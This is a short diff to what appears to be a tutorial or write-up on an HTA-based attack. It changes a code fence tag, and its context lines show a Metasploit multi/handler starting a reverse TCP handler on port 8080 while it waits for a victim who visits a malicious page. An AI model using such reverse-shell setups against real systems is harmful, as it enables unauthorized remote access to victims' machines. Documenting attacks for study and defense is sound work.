@@ -281,7 +281,7 @@ Now all the attacker needs to do is wait for the victim to visit the malicious w
 
 As soon as that happens, the attacker is granted with a very familiar and rewarding message displaying:
 
-```
+```hta
 msf5 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 0.0.0.0:8080 
